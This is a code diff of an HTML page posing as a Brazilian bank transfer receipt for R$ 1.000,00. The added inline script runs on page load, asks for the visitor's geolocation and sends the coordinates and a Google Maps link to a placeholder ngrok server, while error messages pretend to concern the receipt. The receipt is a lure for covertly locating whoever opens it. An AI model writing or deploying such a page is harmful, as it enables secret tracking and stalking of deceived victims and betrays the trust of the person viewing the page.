@@ -1,28 +1,80 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Comprovante Nubank</title>
-  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
+
 <body>
-  <div class="container" id="comprovante">
-    <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-0.png" alt="Nubank" class="logo">
-    <h1>Comprovante de Transferência</h1>
-    <div class="dados">
-      <p><strong>Tipo:</strong> PIX</p>
-      <p><strong>Cliente:</strong> João da Silva</p>
-      <p><strong>Valor:</strong> R$ 1.000,00</p>
-      <p><strong>Data:</strong> 26/04/2025</p>
-      <p><strong>Banco Destino:</strong> Nubank S.A.</p>
-      <p><strong>Agência:</strong> 0001</p>
-      <p><strong>Conta:</strong> 1234567-8</p>
-      <p><strong>Autenticação:</strong> 4B1A-8C2F-5D7E-9A0B</p>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
-    <button id="abrirComprovante">Ver Comprovante Completo</button>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("NGROK_SERVER/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
+  </script>
 </body>
+
 </html>
